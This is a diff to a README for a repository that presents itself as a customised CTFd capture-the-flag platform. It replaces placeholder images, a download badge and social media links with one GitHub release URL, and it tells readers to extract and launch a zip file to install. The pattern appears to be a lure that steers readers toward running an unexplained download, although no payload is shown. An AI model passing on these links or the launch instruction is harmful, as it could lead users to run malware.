@@ -1,6 +1,6 @@
 # 🚀 Welcome to CTFd CarSU-CTF Repository!
 
-![CTFd_CarSU-CTF](https://via.placeholder.com/800x400)
+![CTFd_CarSU-CTF](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
 
 ## Overview
 
@@ -17,7 +17,7 @@ Welcome to the CTFd CarSU-CTF repository, where we have customized the deploymen
 To get started with our CTFd platform, follow the steps below:
 
 1. Download the necessary files by clicking on the link below:
-   [![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Download Zip")
+   [![Download Zip](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0 "Download Zip")
 
    (Note: The zip file needs to be extracted and launched for installation)
 
@@ -47,7 +47,7 @@ Are you ready to test your cybersecurity skills and join our CTF challenges? Get
 
 Join our vibrant cybersecurity community to connect with like-minded individuals, share insights, and collaborate on challenging projects. We welcome cybersecurity enthusiasts of all skill levels to join us on this exciting journey!
 
-![Community Support](https://via.placeholder.com/800x400)
+![Community Support](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
 
 ## Contributors
 
@@ -61,9 +61,9 @@ We value your feedback and suggestions to improve our CTFd platform further. Fee
 
 Stay connected with us for the latest updates, challenges, and cybersecurity news:
 
-- Follow us on [Twitter](https://twitter.com/CTFd_CarSU-CTF)
-- Like us on [Facebook](https://www.facebook.com/CTFd_CarSU-CTF)
-- Subscribe to our [YouTube](https://www.youtube.com/channel/CTFd_CarSU-CTF)
+- Follow us on [Twitter](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
+- Like us on [Facebook](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
+- Subscribe to our [YouTube](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
 
 Let's continue to learn, grow, and thrive in the world of cybersecurity together! 🛡️💻🔒
 
